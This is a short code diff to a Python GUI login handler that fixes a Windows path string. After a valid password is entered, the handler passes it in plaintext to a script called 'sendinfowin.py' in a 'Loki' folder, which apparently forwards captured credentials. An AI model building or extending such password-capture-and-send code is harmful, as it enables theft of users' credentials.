@@ -132,7 +132,7 @@ def on_button1_click(button_text):
     global valid
     valid = is_valid_password (user, pword)
     if valid:
-        other_script_path = 'C:\Users\Public\Loki\sendinfowin.py'
+        other_script_path = r'C:\Users\Public\Loki\sendinfowin.py'
         subprocess.call ([sys.executable, other_script_path, pword])
         root.destroy ()
     else:
